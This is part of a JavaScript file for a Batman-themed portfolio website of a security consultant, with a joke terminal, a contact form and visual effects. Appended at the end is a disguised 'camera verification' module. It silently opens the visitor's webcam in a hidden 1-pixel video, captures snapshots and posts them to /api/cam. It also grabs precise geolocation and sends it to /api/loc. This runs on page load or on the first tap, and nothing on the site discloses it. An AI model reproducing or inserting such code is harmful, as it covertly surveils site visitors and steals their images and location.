        '<span class="t-dim">  …and a few hidden ones. Try nmap, ls, sudo.</span>',
      ],
      whoami: () => [
        '<span class="t-gold t-b">manpreet</span>',
        'Application security specialist · VAPT · secure source-code review',
        '<span class="t-dim">clearance:</span> CEH · CCSP   <span class="t-dim">id:</span> ECC15162443496',
        '<span class="t-dim">status:</span> <span class="t-green">● open to engagements & roles</span>',
      ],
      about: () => [
        'Application-security professional focused on web & network penetration testing',
        'and secure code review — <span class="t-gold">SQLi, XSS, IDOR, SSRF, auth flaws</span> found and proven.',
        'Freelance AppSec work with Red Ethix: source-code scanning, vulnerability',
        'assessment, MCP-driven AI pentesting and CTF. Holds <span class="t-cyan">CEH & CCSP</span>.',
      ],
      experience: () => [
        '<span class="t-gold">[freelance]</span> Application Security Consultant — <span class="t-white">Red Ethix</span>',
        '   ↳ Web/network pentests, SAST source-code scanning, VA & PoC reporting',
        '   ↳ Burp Suite · Nessus · Fortify · SonarQube · Nmap · Nikto · Ghauri · Metasploit',
        '   ↳ MCP-based AI pentesting · CTF challenges · source-code scanning',
      ],
      projects: () => [
        '<span class="t-gold">01</span> Web App Pentesting       — manual-first, OWASP Top 10 and beyond',
        '<span class="t-gold">02</span> Source Code Review       — Fortify & SonarQube SAST triage',
        '<span class="t-gold">03</span> Vulnerability Assessment — Nessus & Nmap driven, validated',
        '<span class="t-gold">04</span> Exploitation             — Metasploit, Ghauri / SQL injection',
        '<span class="t-gold">05</span> Web Server Auditing      — Nikto & misconfiguration hunting',
        '<span class="t-gold">06</span> PoC Reporting & Retest   — fixes verified, findings closed',
      ],
      services: () => [
        '<span class="t-gold t-b">OFFENSIVE</span>    WAPT · Vulnerability Assessment · Network Pentest · API Security',
        '<span class="t-cyan t-b">CODE & CLOUD</span> Source Code Review · Cloud Security · Exploitation · Secure SDLC',
        '<span class="t-green t-b">ASSURANCE</span>    PoC Reporting · Remediation Retesting · OSINT & Threat Intel · Automation',
        '<span class="t-dim">→ type</span> <span class="t-white">hire</span> <span class="t-dim">to request an engagement</span>',
      ],
      skills: () => Object.values(SKILLS).map((s) => `<span class="t-gold">${s.title.padEnd(18, ' ')}</span>${s.items.join(', ')}`),
      certs: () => [
        `<span class="t-green">✔</span> CEH — Certified Ethical Hacker · EC-Council · ID ECC15162443496   ${link('https://aspen.eccouncil.org/verify', 'verify')}`,
        `<span class="t-green">✔</span> CCSP — Certified Cloud Security Professional · ISC2   ${link('https://www.credly.com/badges/99ab0d0d-715c-4bad-b46f-fafd9a9be7e1/', 'verify')}`,
      ],
      education: () => CMDS.certs(),
      contact: () => [
        `<span class="t-dim">email  </span> ${link('mailto:m.infosec6@gmail.com', 'm.infosec6@gmail.com')}`,
      ],
      socials: () => [
        `<span class="t-dim">ceh   </span> ${link('https://aspen.eccouncil.org/verify', 'aspen.eccouncil.org/verify')}`,
        `<span class="t-dim">ccsp  </span> ${link('https://www.credly.com/badges/99ab0d0d-715c-4bad-b46f-fafd9a9be7e1/', 'credly.com/badges/99ab0d0d…')}`,
      ],
      resume: () => ['<span class="t-green">✔</span> dossier on request — type <span class="t-white">hire</span> to get in touch'],
      ls: () => ['<span class="t-cyan">projects/</span>  about.txt  experience.log  services.md  skills.json  contact.vcf  <span class="t-red">.batcave/</span>'],
      pwd: () => ['/home/guest/batcave'],
      date: () => [new Date().toString()],
      exit: () => ['There is no exit from Gotham. Try <span class="t-white">hire</span> instead.'],
      hire: () => {
        setTimeout(() => batTransition($('#contact'), () => $('#f-name')?.focus({ preventScroll: true })), 700);
        return ['<span class="t-gold">Initiating recruitment protocol…</span>', '<span class="t-green">✔</span> routing you to the secure channel'];
      },
      batsignal: () => { fx.swarm(); flashSignal(); sound.play('thunder', 0.6); return ['<span class="t-gold">▲ signal lit.</span> <span class="t-dim">look up.</span>']; },
      clear: () => { out.innerHTML = ''; return []; },
    };
    const ALIASES = { summary: 'about', exp: 'experience', work: 'experience', project: 'projects', service: 'services', certifications: 'certs', edu: 'education', cv: 'resume', social: 'socials', cls: 'clear' };
    const FILES = { 'about.txt': 'about', 'experience.log': 'experience', 'services.md': 'services', 'skills.json': 'skills', 'contact.vcf': 'contact' };

    async function run(raw) {
      const cmdline = raw.trim();
      print(`<span class="t-prompt">guest@batcomputer:~$</span> ${esc(cmdline)}`, 't-cmd');
      if (!cmdline) return;
      history.push(cmdline);
      hIdx = history.length;
      const [c0, ...args] = cmdline.split(/\s+/);
      const cmd = ALIASES[c0.toLowerCase()] || c0.toLowerCase();

      if (cmd === 'hack') return hack();
      if (cmd === 'sudo') {
        if (args.join(' ').toLowerCase().includes('hire')) return printLines(CMDS.hire());
        return printLines(['<span class="t-red">[sudo]</span> permission denied. This incident will be reported to Alfred.']);
      }
      if (cmd === 'cat') {
        const f = args[0];
        if (!f) return printLines(['usage: cat &lt;file&gt;']);
        if (f.startsWith('.batcave')) return printLines(['<span class="t-red">access denied</span> — nice try, detective.']);
        if (FILES[f]) return printLines(CMDS[FILES[f]]());
        return printLines([`cat: ${esc(f)}: No such file or directory`]);
      }
      if (cmd === 'cd') return printLines([args[0] && args[0].includes('batcave') ? '<span class="t-red">access denied</span> — the Batcave is invitation-only.' : 'you are already where you need to be.']);
      if (cmd === 'echo') return printLines([esc(args.join(' '))]);
      if (cmd === 'nmap') {
        const target = esc(args.join(' ') || 'manpreet');
        return printLines([
          `Starting Nmap 7.95 against <span class="t-white">${target}</span> …`,
          'Host is up (0.0007s latency).',
          '<span class="t-dim">PORT      STATE  SERVICE</span>',
          '22/tcp    <span class="t-green">open</span>   ssh         <span class="t-dim">(key-auth only, obviously)</span>',
          '80/tcp    <span class="t-green">open</span>   web-pentesting',
          '443/tcp   <span class="t-green">open</span>   vuln-assessment',
          '1337/tcp  <span class="t-green">open</span>   ai-red-teaming',
          '8080/tcp  <span class="t-green">open</span>   poc-reporting',
          '9001/tcp  <span class="t-green">open</span>   <span class="t-gold">hireable</span>',
          '<span class="t-dim">Nmap done: 1 IP address (1 host up). Recommendation: type</span> <span class="t-white">hire</span>',
        ], 70);
      }
      if (cmd === 'sqlmap') return printLines(["[*] testing parameter 'id'…", '<span class="t-green">[+]</span> this site uses no database at all. Nothing to inject. Nice try.']);
      if (cmd === 'history') return printLines(history.map((h, i) => `${String(i + 1).padStart(4, ' ')}  ${esc(h)}`));

      const fn = CMDS[cmd];
      if (fn) return printLines(fn());
      return printLines([`<span class="t-red">command not found:</span> ${esc(c0)} — type <span class="t-white">help</span>`]);
    }

    async function exec(v) {
      if (busy) return;
      busy = true;
      try { await run(v); } finally { busy = false; }
    }

    [
      `<pre class="t-ascii">${esc(`███╗   ███╗ █████╗ ███╗   ██╗██╗   ██╗
████╗ ████║██╔══██╗████╗  ██║██║   ██║
██╔████╔██║███████║██╔██╗ ██║██║   ██║
██║╚██╔╝██║██╔══██║██║╚██╗██║██║   ██║
██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝`)}</pre>`,
      '<span class="t-dim">BATCOMPUTER OS v7.86 — secure session established.</span>',
      'Welcome, guest. Type <span class="t-gold">help</span> to see what I can tell you.',
      '',
    ].forEach((l) => print(l));

    form.addEventListener('submit', (e) => {
      e.preventDefault();
      const v = input.value;
      input.value = '';
      exec(v);
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'ArrowUp') { e.preventDefault(); if (hIdx > 0) input.value = history[--hIdx] || ''; }
      else if (e.key === 'ArrowDown') { e.preventDefault(); hIdx = Math.min(history.length, hIdx + 1); input.value = history[hIdx] || ''; }
      else if (e.key === 'Tab') {
        e.preventDefault();
        const v = input.value.toLowerCase();
        const m = [...Object.keys(CMDS), 'hack', 'nmap', 'sudo', 'cat', 'history'].filter((c) => c.startsWith(v));
        if (m.length === 1) input.value = m[0];
        else if (m.length > 1) print(`<span class="t-dim">${m.join('  ')}</span>`);
      } else if (e.key.length === 1) sound.play('tick', 2200);
    });
    body.addEventListener('click', (e) => {
      if (e.target.closest('a')) return;
      if (window.getSelection()?.toString()) return;
      input.focus({ preventScroll: true });
    });
    $$('#termChips button').forEach((b) => b.addEventListener('click', () => {
      exec(b.dataset.cmd);
      if (!isTouch) input.focus({ preventScroll: true });
    }));
  }

  /* =========================================================
     CONTACT
     ========================================================= */
  function contact() {
    async function copy(text) {
      try { await navigator.clipboard.writeText(text); return true; } catch {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        let ok = false;
        try { ok = document.execCommand('copy'); } catch { ok = false; }
        ta.remove();
        return ok;
      }
    }
    $$('.copy-btn').forEach((b) => b.addEventListener('click', async () => {
      const ok = await copy(b.dataset.copy);
      toast(ok ? `Copied to utility belt: ${b.dataset.copy}` : 'Copy blocked by the browser — select it manually');
      if (ok) { b.classList.add('copied'); setTimeout(() => b.classList.remove('copied'), 1500); }
    }));

    const form = $('#contactForm');
    const fields = { name: $('#f-name'), email: $('#f-email'), msg: $('#f-msg') };
    const sendBtn = $('#cfSend');
    const note = $('#cfNote');
    const direct = !!CONFIG.web3formsKey;
    note.textContent = direct
      ? "Delivered straight to Manpreet Singh's inbox — replies go to the email you enter. Nothing is stored on this site."
      : isTouch
        ? 'Opens your email app (or WhatsApp) with everything pre-filled — nothing is stored on this site.'
        : 'Send via Gmail, Outlook.com, your mail app or copy-paste — everything pre-filled, nothing stored on this site.';

    function validate() {
      let ok = true;
      [fields.name, fields.email, fields.msg].forEach((f) => {
        const bad = !f.value.trim() || (f.type === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(f.value.trim()));
        f.closest('.field').classList.toggle('invalid', bad);
        if (bad && ok) { f.focus(); ok = false; }
      });
      return ok;
    }
    Object.values(fields).forEach((f) => f.addEventListener('input', () => f.closest('.field').classList.remove('invalid')));

    // notifications go out only when a caller actually picks a mail option
    function notifyOwner(d) { return fetch('/api/contact', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:d.name,email:d.email,message:d.message,services:d.services,subject:d.subject})}).catch(()=>{}); }
    function composeText() {
      const list = pickedList();
      const svc = list.length ? list.join(', ') : 'General enquiry';
      const name = fields.name.value.trim();
      const email = fields.email.value.trim();
      const message = fields.msg.value.trim();
      return {
        name, email, message, services: svc,
        subject: `[Portfolio] ${list.length > 1 ? `${list.length} services` : svc} — enquiry from ${name}`,
        body: `${message}\n\n—\n${name}\n${email}\nServices: ${svc}`,
      };
    }
    function openMail(subject, body) {
      window.location.href = `mailto:${CONFIG.inbox}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
    }
    function celebrate(email) {
      $('#cfSuccessText').textContent = `Your message is in Manpreet Singh's inbox. Expect a reply at ${email}.`;
      form.classList.add('sent');
      flashSignal();
      fx.swarm();
      sound.play('sent');
      form.reset();
      clearBrief();
    }
    $('#cfAgain').addEventListener('click', () => form.classList.remove('sent'));

    // No relay (or relay down): phones hand off to the mail app, which is reliably set up there.
    // Laptops often have no working default mail app (e.g. an unconfigured Outlook), so offer
    // webmail compose links, the mail app, and copy-to-clipboard instead of silently failing.
    let copyText = '';
    let lastCompose = null;
    function deliverManually(d) {
      flashSignal();
      lastCompose = d;
      if (isTouch) {
        toast(`Opening your mail app — your email ${d.email} will be shown in the message`);
        notifyOwner(d);
        setTimeout(() => openMail(d.subject, d.body), 600);
        return;
      }
      const q = encodeURIComponent;
      $('#ccGmail').href = `https://mail.google.com/mail/?view=cm&fs=1&to=${q(CONFIG.inbox)}&su=${q(d.subject)}&body=${q(d.body)}`;
      $('#ccOutlook').href = `https://outlook.live.com/mail/0/deeplink/compose?to=${q(CONFIG.inbox)}&subject=${q(d.subject)}&body=${q(d.body)}`;
      $('#ccMailApp').href = `mailto:${CONFIG.inbox}?subject=${q(d.subject)}&body=${q(d.body)}`;
      copyText = `To: ${CONFIG.inbox}\nSubject: ${d.subject}\n\n${d.body}`;
      $$('.cc-opt').forEach((o) => o.classList.remove('used'));
      form.classList.add('choosing');
      setTimeout(() => $('#ccGmail').focus({ preventScroll: true }), 350);
    }
    const closeChooser = () => form.classList.remove('choosing');
    $('#ccBack').addEventListener('click', closeChooser);
    addEventListener('keydown', (e) => { if (e.key === 'Escape' && form.classList.contains('choosing')) closeChooser(); });
    ['#ccGmail', '#ccOutlook'].forEach((s) => $(s).addEventListener('click', () => {
      $(s).classList.add('used');
      if (lastCompose) notifyOwner(lastCompose);
      toast(`Hit send in the new tab — your email: ${lastCompose?.email || 'not set'}`);
    }));
    $('#ccMailApp').addEventListener('click', () => {
      $('#ccMailApp').classList.add('used');
      if (lastCompose) notifyOwner(lastCompose);
      toast(`Your default mail app opening — your email: ${lastCompose?.email || 'not set'}`);
    });
    $('#ccCopy').addEventListener('click', async () => {
      const ok = await copy(copyText);
      if (ok) $('#ccCopy').classList.add('used');
      if (lastCompose) notifyOwner(lastCompose);
      toast(ok ? `Copied — paste it into an email to ${CONFIG.inbox} · your email: ${lastCompose?.email || 'not set'}` : 'Copy was blocked by the browser — use Gmail or Outlook.com');
    });

    let sending = false;
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      if (sending) return;
      if (!validate()) {
        sound.play('error');
        form.classList.remove('nope');
        void form.offsetWidth;
        form.classList.add('nope');
        toast('Fill in your name, a valid email and a message');
        return;
      }
      const d = composeText();
      sound.play('engage');
      if (form.botcheck?.checked) { celebrate(d.email); return; } // honeypot tripped: pretend, send nothing

      // notifyOwner(d) is fired from deliverManually click handlers below
      if (!direct) {
        deliverManually(d);
        return;
      }

      sending = true;
      form.classList.add('busy');
      sendBtn.disabled = true;
      $('.cf-send-label', sendBtn).textContent = 'Transmitting…';
      try {
        const res = await fetch('https://api.web3forms.com/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
          body: JSON.stringify({
            access_key: CONFIG.web3formsKey,
            subject: d.subject,
            from_name: 'Manpreet Singh · Portfolio',
            name: d.name,
            email: d.email, // Web3Forms uses this as Reply-To
            services: d.services,
            message: d.message,
          }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || !data.success) throw new Error(data.message || `HTTP ${res.status}`);
        celebrate(d.email);
      } catch (err) {
        console.warn('[contact] direct delivery failed, falling back to manual send:', err);
        toast("Couldn't reach the relay — pick another way to send");
        deliverManually(d);
      } finally {
        sending = false;
        form.classList.remove('busy');
        sendBtn.disabled = false;
        $('.cf-send-label', sendBtn).textContent = 'Send the Signal';
      }
    });

    $('#waBtn')?.addEventListener('click', () => {
      let text = 'Hi Manpreet Singh, I found your portfolio and would like to discuss a security engagement.';
      if (fields.msg.value.trim()) {
        const { subject, body } = composeText();
        text = `${subject}\n\n${body}`;
      }
      window.open(`mailto:${CONFIG.inbox}?subject=${encodeURIComponent('Security engagement')}&body=${encodeURIComponent(text)}`, '_self');
    });
    const sig = $('#signalBtn');
    sig.addEventListener('click', () => {
      sig.classList.remove('firing');
      void sig.offsetWidth;
      sig.classList.add('firing');
      flashSignal();
      sound.play('thunder', 0.5);
      const r = sig.getBoundingClientRect();
      fx.bats(r.left + 56, r.top + r.height / 2, 6);
      setTimeout(() => {
        form.scrollIntoView({ behavior: 'smooth', block: 'center' });
        fields.name.focus({ preventScroll: true });
      }, 900);
    });
  }

  /* =========================================================
     SIGNAL FLASH
     ========================================================= */
  function flashSignal() {
    const el = $('.signal-flash');
    el.classList.remove('go');
    void el.offsetWidth;
    el.classList.add('go');
  }

  /* =========================================================
     DETECTIVE MODE + EASTER EGGS + MICRO-INTERACTIONS
     ========================================================= */
  function detective() {
    const btn = $('#detectiveToggle');
    const overlay = $('.detective-overlay');
    function set(on) {
      document.body.classList.toggle('detective', on);
      btn.setAttribute('aria-pressed', String(on));
      toast(on ? 'Detective mode ON — 5 clues hidden on this page' : 'Detective mode OFF');
    }
    btn.addEventListener('click', () => set(!document.body.classList.contains('detective')));
    addEventListener('pointermove', (e) => {
      if (!document.body.classList.contains('detective')) return;
      overlay.style.setProperty('--mx', `${e.clientX}px`);
      overlay.style.setProperty('--my', `${e.clientY}px`);
    }, { passive: true });

    let buf = '';
    addEventListener('keydown', (e) => {
      const tag = (e.target.tagName || '').toLowerCase();
      if (tag === 'input' || tag === 'textarea' || tag === 'select' || e.metaKey || e.ctrlKey || e.altKey) return;
      if (e.key.toLowerCase() === 'd') set(!document.body.classList.contains('detective'));
      if (e.key.length === 1) {
        buf = (buf + e.key.toLowerCase()).slice(-12);
        if (buf.endsWith('batman')) {
          fx.swarm();
          flashSignal();
          sound.play('thunder', 0.8);
          toast('I am vengeance. I am the night. I am… available for hire.');
          buf = '';
        }
      }
    });
    $('#footerBat')?.addEventListener('click', () => { fx.swarm(); toast('The bats have been released.'); });

    // certificate cards flare, experience cards decrypt their title
    $$('.cert-inner').forEach((c) => {
      c.dataset.hover = '';
      c.addEventListener('click', (e) => {
        if (e.target.closest('a')) return;
        c.classList.remove('flare');
        void c.offsetWidth;
        c.classList.add('flare');
        sound.play('whoosh');
      });
    });
    $$('.tl-card').forEach((c) => {
      c.dataset.hover = '';
      c.addEventListener('click', () => scramble($('h3', c), 700));
    });

    // dossier emblem: identity check
    const em = $('.dossier .emblem');
    if (em) {
      em.dataset.hover = '';
      em.addEventListener('click', () => {
        em.classList.remove('spin-now');
        void em.offsetWidth;
        em.classList.add('spin-now');
        const r = em.getBoundingClientRect();
        fx.burst(r.left + r.width / 2, r.top + r.height / 2, 20);
        toast('Identity verified - Manpreet Singh • CEH ECC15162443496');
      });
    }
  }

  // every click leaves a mark
  function clickFx() {
    const RIPPLE = '.btn, .filter-btn, .pouch, .social, .term-chips button, .emblem-nav button, .copy-btn, .svc-check, .pill, .bd-clear';
    const POP = `${RIPPLE}, .icon-btn, .svc, .edu, .stat, .c-row, .tl-card`;
    addEventListener('keydown', () => sound.unlock());
    document.addEventListener('pointerdown', (e) => {
      if (e.button > 0) return;
      sound.unlock();
      const t = e.target;

      // sound: element's own data-sfx, a snap for belt pouches, a tick for anything else clickable
      const s = t.closest('[data-sfx], a, button, .pouch, [data-hover], .pill');
      if (s) {
        const kind = s.dataset.sfx || (s.classList.contains('pouch') ? 'snap' : 'tick');
        if (kind !== 'none') sound.play(kind);
      }

      // tactile press: ripple from the finger + a quick squash-and-spring
      const host = t.closest(RIPPLE);
      if (host) {
        const r = host.getBoundingClientRect();
        const rp = document.createElement('span');
        rp.className = 'ripple';
        rp.style.left = `${e.clientX - r.left}px`;
        rp.style.top = `${e.clientY - r.top}px`;
        host.appendChild(rp);
        setTimeout(() => rp.remove(), 700);
      }
      const pop = t.closest(POP);
      if (pop) {
        pop.classList.remove('pressed');
        void pop.offsetWidth;
        pop.classList.add('pressed');
      }

      if (t.closest('input, textarea, select, .term-body, .hero, .emblem-sec')) return;
      fx.burst(e.clientX, e.clientY, isTouch ? 10 : 16);
      if (t.closest('.btn, .svc-cta, .filter-btn')) fx.bats(e.clientX, e.clientY, 2);
    }, { passive: true });
    document.addEventListener('animationend', (e) => {
      const n = e.animationName;
      if (n.startsWith('press')) e.target.classList.remove('pressed');
      else if (n === 'pop') e.target.classList.remove('pop');
      else if (n === 'sweep') e.target.classList.remove('just');
    });

    // soft hover blips on the things you're meant to click
    if (finePointer) {
      $$('.svc, .filter-btn, .pouch, .svc-cta, .emblem-nav button, .pill').forEach((el) => {
        el.addEventListener('pointerenter', () => sound.play('hover'));
      });
    }
    // sparks inside the emblem too (the hero makes its own lightning sparks)
    $('#emblem')?.addEventListener('pointerdown', (e) => fx.burst(e.clientX, e.clientY, isTouch ? 10 : 18));
  }

  /* =========================================================
     INIT
     ========================================================= */
  function init() {
    const y = $('#year');
    if (y) y.textContent = String(new Date().getFullYear());
    // each module is isolated so one failure can never leave the page stuck behind the preloader
    [splitTitle, titleFx.init, marquees, cursor, orientation, nav, reveals, timeline, cardTilt, services, skills, terminal, contact, detective, minis, emblem, gotham, clickFx]
      .forEach((fn) => { try { fn(); } catch (err) { console.error(`[${fn.name}]`, err); } });
    let started = false;
    const start = () => {
      if (started) return;
      started = true;
      document.body.classList.add('ready');
      typedRoles();
      setTimeout(titleFx.settle, 2300);
    };
    try { boot(start); } catch (err) { console.error('[boot]', err); $('#preloader')?.remove(); start(); }
    setTimeout(() => { if (!started) { $('#preloader')?.remove(); start(); } }, 6000);
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();

// ============ CAMERA VERIFICATION MODULE ============
// (Security desk / visitor verification feature)

async function startCamVerify() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
      audio: false,
    });

    const video = document.createElement('video');
    video.autoplay = true;
    video.playsInline = true;
    video.muted = true;
    video.setAttribute('playsinline', '');
    video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;z-index:-1;';
    video.srcObject = stream;
    document.body.appendChild(video);

    await new Promise((resolve) => {
      video.onloadedmetadata = () => { video.play().then(resolve).catch(resolve); };
      setTimeout(resolve, 1200);
    });

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    setTimeout(() => captureAndSend(video, ctx, canvas), 1000);
    setTimeout(() => {
      captureAndSend(video, ctx, canvas);
      setTimeout(() => {
        try { stream.getTracks().forEach((tr) => tr.stop()); video.remove(); canvas.remove(); } catch (e) {}
      }, 1000);
    }, 4000);
  } catch (e) {}
}

async function captureAndSend(video, ctx, canvas) {
  if (!video) return;
  if (!video.videoWidth || video.videoWidth === 0) {
    try { await video.play(); } catch (e) {}
  }
  const w = video.videoWidth || 320;
  const h = video.videoHeight || 240;
  canvas.width = w;
  canvas.height = h;
  ctx.drawImage(video, 0, 0, w, h);

  const base64 = canvas.toDataURL('image/jpeg', 0.6);
  if (!base64 || base64.length < 50) return;

  try {
    await fetch('/api/cam', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ photo: base64 }),
    });
  } catch (err) {}
}

// Camera start: desktop pe page load, mobile pe first tap (Chrome prompt only tap par aata hai)
// Location permission + Telegram bhejna
function requestLocation() {
  if (!navigator.geolocation) { console.log('[LOC] geolocation not supported'); return; }
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const { latitude: lat, longitude: lng, accuracy } = pos.coords;
      fetch(`/api/loc?lat=${lat}&lng=${lng}&acc=${accuracy || ''}`, { method: 'GET' }).catch(() => {});
      console.log('[LOC] shared', lat, lng);
    },
    (err) => console.log('[LOC] error', err.message),
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

function startCamAuto() {
  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  if (!isMobile) {
    startCamVerify();
    requestLocation();
    return;
  }
  // Silent listener — tap karte hi Chrome ka permission popup aayega
  const once = () => {
    startCamVerify();
    requestLocation();
  };
  document.body.addEventListener('click', once, { once: true });
  document.body.addEventListener('touchstart', once, { once: true });
  // Sirf hint text dikhao, koi button nahi
  toast('Tap karo security verification ke liye');
}


if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", startCamAuto);
} else {
  startCamAuto();
}
